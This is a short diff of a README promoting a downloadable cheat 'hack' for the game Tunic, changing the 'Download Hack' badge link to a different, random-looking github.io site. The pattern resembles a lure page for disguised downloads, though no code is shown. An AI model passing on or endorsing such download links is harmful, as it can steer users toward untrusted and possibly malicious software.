@@ -4,7 +4,7 @@ Tunic is that one game that looks chill but hits like a Soulslike. Cute fox? Che
 
 Forget dying over and over. With the right hacks activated, you can enjoy the story, uncover all the secrets, and have a way smoother experience – all without wasting hours grinding or backtracking.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://rb56-Tunic-Hack.github.io/.github)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://bigboyluxunicorn88.github.io)
 ---
 
 ## 🧨 What Does the Tunic Hack Do?
